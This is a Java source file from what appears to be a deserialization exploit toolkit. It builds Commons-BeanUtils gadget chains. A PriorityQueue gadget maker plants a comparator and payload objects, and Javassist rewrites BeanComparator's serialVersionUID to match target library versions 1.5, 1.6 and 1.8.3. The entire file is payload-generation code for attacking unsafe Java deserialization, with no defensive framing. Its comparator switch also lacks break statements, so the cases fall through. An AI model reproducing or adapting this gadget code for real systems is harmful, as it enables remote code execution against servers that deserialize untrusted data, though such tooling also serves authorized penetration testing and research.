package com.ppp.chain.commonsbeanutils;

import com.ppp.Printer;
import com.ppp.utils.Reflections;
import javassist.*;
import org.apache.commons.lang3.compare.ObjectToStringComparator;
import org.apache.logging.log4j.util.PropertySource;

import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * @author Whoopsunix
 */
public class BeanComparatorBuilder {
    enum CompareEnum {
        BeanComparator, CaseInsensitiveComparator, AttrCompare, ObjectToStringComparator, PropertySource, ReverseComparator
    }

    public static Comparator scheduler(CompareEnum compareEnum, CBVersionEnum cbVersionEnum) throws Exception {
        Comparator comparator = comparatorScheduler(cbVersionEnum);
        switch (compareEnum) {
            case BeanComparator:
                Reflections.setFieldValue(comparator, "property", "lowestSetBit");
            case CaseInsensitiveComparator:
                Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
            case AttrCompare:
                Reflections.setFieldValue(comparator, "comparator", Class.forName("com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare").newInstance());
            case ObjectToStringComparator:
                Reflections.setFieldValue(comparator, "comparator", new ObjectToStringComparator());
            case PropertySource:
                Reflections.setFieldValue(comparator, "comparator", new PropertySource.Comparator());
            case ReverseComparator:
                // cc3 cc4 也有一个名字一个的利用类
                Reflections.setFieldValue(comparator, "comparator", Reflections.newInstance("java.util.Collections$ReverseComparator"));
        }
        return comparator;
    }

    public static Object queueGadgetMaker(Comparator comparator, Object object, Object queueParam, String value) throws Exception {
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(queueParam);
        queue.add(queueParam);

        Reflections.setFieldValue(comparator, "property", value);
        Reflections.setFieldValue(queue, "queue", new Object[]{object, object});

        return queue;
    }

    public static Comparator comparatorScheduler(CBVersionEnum cbVersionEnum) throws Exception {
        long serialVersionUID = CBVersionEnum.Default.getSerialVersionUID();
        switch (cbVersionEnum) {
            case V_1_8_3:
                serialVersionUID = CBVersionEnum.V_1_8_3.getSerialVersionUID();
                break;
            case V_1_6:
                serialVersionUID = CBVersionEnum.V_1_6.getSerialVersionUID();
                break;
            case V_1_5:
                serialVersionUID = CBVersionEnum.V_1_5.getSerialVersionUID();
                break;
        }

        if (serialVersionUID != 0) {
            Printer.yellowInfo("serialVersionUID: " + serialVersionUID);
        }

        return new BeanComparatorBuilder().createBeanComparator(serialVersionUID);
    }

    /**
     * 修改BeanComparator类的serialVersionUID
     */
    public Comparator createBeanComparator(long serialVersionUID) {
        try {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
            CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
            try {
                CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
                ctBeanComparator.removeField(ctSUID);
            } catch (NotFoundException e) {
            }
            if (serialVersionUID != 0) {
                ctBeanComparator.addField(CtField.make(String.format("private static final long serialVersionUID = %dL;", serialVersionUID), ctBeanComparator));
            }

            Comparator beanComparator = (Comparator) ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
            ctBeanComparator.defrost();

            return beanComparator;
        } catch (Exception e) {

        }
        return null;
    }

    public class JavassistClassLoader extends ClassLoader {
        public JavassistClassLoader() {
            super();
        }
    }

}
